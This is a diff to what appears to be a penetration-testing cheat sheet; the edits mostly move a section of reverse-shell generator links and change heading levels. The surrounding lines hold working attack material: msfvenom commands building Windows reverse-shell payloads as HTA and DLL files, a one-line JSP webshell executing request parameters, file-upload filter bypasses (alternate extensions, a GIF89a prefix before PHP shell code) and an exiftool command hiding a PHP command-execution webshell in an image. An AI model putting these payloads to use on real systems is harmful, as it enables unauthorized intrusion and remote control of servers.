@@ -49,11 +49,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 ```
 
-## Online Generator
-<https://www.revshells.com/>
-<https://weibell.github.io/reverse-shell-generator/>
-
-
+```
+```
 ## Single line Webshell
 
 #### PHP
@@ -70,9 +67,17 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
+```
+```
+## Online Generator
+<https://www.revshells.com/>
+<https://weibell.github.io/reverse-shell-generator/>
+
+```
+```
 ## Upload Bypass
 
-### Rename the extension 
+#### Rename the extension 
 ```
 PHP: phtml, .php, .php3, .php4, .php5, and .inc
 
@@ -85,7 +90,7 @@ JSP: .jsp, .jspx, .jsw, .jsv, and .jspf
 Coldfusion: .cfm, .cfml, .cfc, .dbm
 ```
 
-### Use GIF89a
+#### Use GIF89a
 ```
 Basically you just add the text "GIF89a;" before you shell-code. As exemple :
 
@@ -95,11 +100,13 @@ system($_GET['cmd']);//or you can insert your complete shell code
 ?>
 ```
 
-### Include in image
+#### Include in image
 ```
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
 ```
 
+```
+```
 ## Shell Stabilisation
 
 #### Technique 01: Python
